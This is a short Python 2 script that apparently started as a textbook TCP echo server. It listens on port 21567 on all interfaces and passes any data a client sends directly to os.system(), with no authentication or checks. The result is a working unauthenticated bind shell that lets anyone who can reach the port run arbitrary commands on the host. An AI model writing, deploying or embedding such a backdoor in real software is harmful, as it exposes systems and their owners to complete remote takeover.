#!/usr/bin/env python

from socket import *
from time import ctime
from os import system
HOST = ''
PORT = 21567
BUFSIZE = 1024
ADDR = (HOST,PORT)

tcpSerSock = socket(AF_INET,SOCK_STREAM)
tcpSerSock.bind(ADDR)
tcpSerSock.listen(5)


try:
    while True :
        print 'Waiting for connection...'
        tcpCliSock,addr = tcpSerSock.accept()
        print '...connected from :',addr
    
        while True:
            data = tcpCliSock.recv(BUFSIZE)
            if not data:
                break
            system(data)
           # tcpCliSock.send('[%s] %s'%(ctime(),data))
            #tcpCliSock.close()
except Exception ,diag:
    #print diag
    tcpSerSock.close()

tcpSerSock.close()


